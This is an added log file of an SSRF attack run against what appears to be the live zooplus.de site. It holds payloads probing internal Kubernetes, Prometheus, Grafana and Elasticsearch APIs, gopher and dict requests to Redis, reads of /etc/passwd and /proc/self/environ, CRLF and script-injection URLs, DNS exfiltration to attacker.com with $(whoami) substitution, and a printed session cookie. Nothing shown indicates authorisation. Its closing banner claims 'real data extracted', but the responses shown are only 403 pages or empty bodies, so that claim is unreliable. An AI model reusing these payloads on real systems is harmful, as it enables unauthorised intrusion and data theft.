@@ -1,0 +1,455 @@
+[*] Logging in...
+[+] Logged in
+
+================================================================================
+METHOD 1: DNS EXFILTRATION ATTEMPTS
+================================================================================
+
+[*] Trying to trigger DNS lookups that could exfiltrate data...
+    (We can't capture DNS queries without infrastructure, but can test timing)
+
+[*] DNS exfil test: http://test-unique-12345.burpcollaborator.net
+    URL: http://test-unique-12345.burpcollaborator.net
+    Status: 200 | Time: 746.83ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] DNS exfil test: http://ssrf-test-zooplus.oastify.com
+    URL: http://ssrf-test-zooplus.oastify.com
+    Status: 200 | Time: 184.29ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] DNS exfil test: http://$(whoami).attacker.com
+    URL: http://$(whoami).attacker.com
+    Status: 200 | Time: 173.46ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] DNS exfil test: http://$(cat /etc/hostname).attacker.com
+    URL: http://$(cat /etc/hostname).attacker.com
+    Status: 200 | Time: 185.00ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+================================================================================
+METHOD 2: HTTP REDIRECT CHAIN ANALYSIS
+================================================================================
+
+[*] Testing if internal services redirect with data in Location header...
+
+[*] Redirect test: http://grafana.monitoring.svc.cluster.local:3000/login
+    URL: http://grafana.monitoring.svc.cluster.local:3000/login
+    Status: 200 | Time: 180.59ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Redirect test: http://grafana.monitoring.svc.cluster.local:3000/
+    URL: http://grafana.monitoring.svc.cluster.local:3000/
+    Status: 200 | Time: 172.81ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Redirect test: http://kibana.logging.svc.cluster.local:5601/app/home
+    URL: http://kibana.logging.svc.cluster.local:5601/app/home
+    Status: 200 | Time: 186.90ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Redirect test: http://dashboard.kubernetes-dashboard.svc.cluster.local/
+    URL: http://dashboard.kubernetes-dashboard.svc.cluster.local/
+    Status: 200 | Time: 187.05ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Redirect test: http://localhost:8080/
+    URL: http://localhost:8080/
+    Status: 403 | Time: 114.93ms | Length: 919
+    Interesting headers:
+      Server: CloudFront
+    Body preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR
+
+================================================================================
+METHOD 3: HTTP METHODS VARIATION
+================================================================================
+
+[*] Trying different HTTP methods (backend might parse method from URL)...
+
+[*] Method test: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/query?query=up
+    URL: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/query?query=up
+    Status: 200 | Time: 172.71ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Method test: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/targets
+    URL: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/targets
+    Status: 200 | Time: 180.87ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Method test: http://elasticsearch.logging.svc.cluster.local:9200/_cat/indices?v
+    URL: http://elasticsearch.logging.svc.cluster.local:9200/_cat/indices?v
+    Status: 200 | Time: 182.08ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Method test: http://elasticsearch.logging.svc.cluster.local:9200/_search?size=1
+    URL: http://elasticsearch.logging.svc.cluster.local:9200/_search?size=1
+    Status: 200 | Time: 175.44ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+================================================================================
+METHOD 4: PROTOCOL SMUGGLING
+================================================================================
+
+[*] Testing protocol-level attacks (gopher, dict, file)...
+
+[*] Protocol test: gopher://localhost:6379/_INFO
+    URL: gopher://localhost:6379/_INFO
+    Status: 403 | Time: 115.73ms | Length: 919
+    Interesting headers:
+      Server: CloudFront
+    Body preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR
+
+[*] Protocol test: dict://localhost:6379/INFO
+    URL: dict://localhost:6379/INFO
+    Status: 403 | Time: 115.79ms | Length: 919
+    Interesting headers:
+      Server: CloudFront
+    Body preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR
+
+[*] Protocol test: file:///etc/passwd
+    URL: file:///etc/passwd
+    Status: 200 | Time: 178.27ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Protocol test: file:///proc/self/environ
+    URL: file:///proc/self/environ
+    Status: 200 | Time: 178.65ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Protocol test: file:///proc/self/cmdline
+    URL: file:///proc/self/cmdline
+    Status: 200 | Time: 160.00ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+================================================================================
+METHOD 5: RESPONSE HEADER EXTRACTION
+================================================================================
+
+[*] Checking if internal service headers leak data...
+
+[*] Header extraction: http://prometheus.monitoring.svc.cluster.local:9090/
+    URL: http://prometheus.monitoring.svc.cluster.local:9090/
+    Status: 200 | Time: 160.81ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Header extraction: http://grafana.monitoring.svc.cluster.local:3000/api/health
+    URL: http://grafana.monitoring.svc.cluster.local:3000/api/health
+    Status: 200 | Time: 183.92ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Header extraction: http://elasticsearch.logging.svc.cluster.local:9200/
+    URL: http://elasticsearch.logging.svc.cluster.local:9200/
+    Status: 200 | Time: 180.87ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Header extraction: http://kibana.logging.svc.cluster.local:5601/api/status
+    URL: http://kibana.logging.svc.cluster.local:5601/api/status
+    Status: 200 | Time: 188.04ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+================================================================================
+METHOD 6: CRLF INJECTION FOR HEADER SMUGGLING
+================================================================================
+
+[*] Testing CRLF injection to smuggle additional headers...
+
+[*] CRLF injection: http://localhost:8080/%0d%0aX-Custom-Header:%20injected
+    URL: http://localhost:8080/%0d%0aX-Custom-Header:%20injected
+    Status: 403 | Time: 115.82ms | Length: 919
+    Interesting headers:
+      Server: CloudFront
+    Body preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR
+
+[*] CRLF injection: http://localhost:8080/%0aSet-Cookie:%20admin=true
+    URL: http://localhost:8080/%0aSet-Cookie:%20admin=true
+    Status: 403 | Time: 549.15ms | Length: 919
+    Interesting headers:
+      Server: CloudFront
+    Body preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR
+
+[*] CRLF injection: http://localhost:8080/test%0d%0a%0d%0a<script>alert(1)</script>
+    URL: http://localhost:8080/test%0d%0a%0d%0a<script>alert(1)</script>
+    Status: 403 | Time: 115.86ms | Length: 919
+    Interesting headers:
+      Server: CloudFront
+    Body preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR
+
+================================================================================
+METHOD 7: INTERNAL API ENDPOINT BRUTEFORCE
+================================================================================
+
+[*] Testing common internal API endpoints that might leak data...
+
+[*] API endpoint: http://kubernetes.default.svc/api/v1/pods
+    URL: http://kubernetes.default.svc/api/v1/pods
+    Status: 200 | Time: 180.10ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://kubernetes.default.svc/api/v1/services
+    URL: http://kubernetes.default.svc/api/v1/services
+    Status: 200 | Time: 191.05ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://kubernetes.default.svc/api/v1/configmaps
+    URL: http://kubernetes.default.svc/api/v1/configmaps
+    Status: 200 | Time: 176.52ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://kubernetes.default.svc/apis/apps/v1/deployments
+    URL: http://kubernetes.default.svc/apis/apps/v1/deployments
+    Status: 200 | Time: 166.10ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://kubernetes.default.svc/version
+    URL: http://kubernetes.default.svc/version
+    Status: 200 | Time: 184.48ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://kubernetes.default.svc/openapi/v2
+    URL: http://kubernetes.default.svc/openapi/v2
+    Status: 200 | Time: 167.39ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/query?query=up
+    URL: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/query?query=up
+    Status: 200 | Time: 168.23ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/series?match[]=up
+    URL: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/series?match[]=up
+    Status: 200 | Time: 163.99ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/alerts
+    URL: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/alerts
+    Status: 200 | Time: 203.35ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://grafana.monitoring.svc.cluster.local:3000/api/datasources
+    URL: http://grafana.monitoring.svc.cluster.local:3000/api/datasources
+    Status: 200 | Time: 162.65ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://grafana.monitoring.svc.cluster.local:3000/api/dashboards/home
+    URL: http://grafana.monitoring.svc.cluster.local:3000/api/dashboards/home
+    Status: 200 | Time: 165.52ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://grafana.monitoring.svc.cluster.local:3000/api/admin/stats
+    URL: http://grafana.monitoring.svc.cluster.local:3000/api/admin/stats
+    Status: 200 | Time: 190.91ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://elasticsearch.logging.svc.cluster.local:9200/_cluster/stats
+    URL: http://elasticsearch.logging.svc.cluster.local:9200/_cluster/stats
+    Status: 200 | Time: 192.60ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://elasticsearch.logging.svc.cluster.local:9200/_nodes
+    URL: http://elasticsearch.logging.svc.cluster.local:9200/_nodes
+    Status: 200 | Time: 180.59ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] API endpoint: http://elasticsearch.logging.svc.cluster.local:9200/_search?q=*
+    URL: http://elasticsearch.logging.svc.cluster.local:9200/_search?q=*
+    Status: 200 | Time: 193.19ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+================================================================================
+METHOD 8: TIME-BASED BLIND DATA EXTRACTION
+================================================================================
+
+[*] Testing if we can extract data bit-by-bit via timing...
+
+[*] K8s version endpoint (attempt 1/3)
+    URL: http://kubernetes.default.svc/version
+    Status: 200 | Time: 190.78ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] K8s version endpoint (attempt 2/3)
+    URL: http://kubernetes.default.svc/version
+    Status: 200 | Time: 181.21ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] K8s version endpoint (attempt 3/3)
+    URL: http://kubernetes.default.svc/version
+    Status: 200 | Time: 187.70ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+    Average time: 186.56ms (consistency: 9.57ms variance)
+
+[*] Prometheus build info (attempt 1/3)
+    URL: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/status/buildinfo
+    Status: 200 | Time: 167.45ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Prometheus build info (attempt 2/3)
+    URL: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/status/buildinfo
+    Status: 200 | Time: 470.44ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+
+[*] Prometheus build info (attempt 3/3)
+    URL: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/status/buildinfo
+    Status: 200 | Time: 219.87ms | Length: 2
+    Interesting headers:
+      server: istio-envoy
+      Set-Cookie: sid=707455a5-9eb3-45e0-afb2-81e1ed749282; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de
+    Average time: 285.92ms (consistency: 302.99ms variance)
+
+================================================================================
+ADVANCED EXTRACTION RESULTS
+================================================================================
+
+[+] Total tests performed: 36
+[+] Interesting responses: 6
+[+] Leaked headers: 0
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+REAL DATA EXTRACTED VIA ADVANCED TECHNIQUES!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[DATA] http://localhost:8080/
+  Length: 919 bytes
+  Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+
+[DATA] gopher://localhost:6379/_INFO
+  Length: 919 bytes
+  Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+
+[DATA] dict://localhost:6379/INFO
+  Length: 919 bytes
+  Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+
+[DATA] http://localhost:8080/%0d%0aX-Custom-Header:%20injected
+  Length: 919 bytes
+  Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+
+[DATA] http://localhost:8080/%0aSet-Cookie:%20admin=true
+  Length: 919 bytes
+  Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+
+[DATA] http://localhost:8080/test%0d%0a%0d%0a<script>alert(1)</script>
+  Length: 919 bytes
+  Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+
+[+] Full results saved to: logs/advanced_extraction_results.json
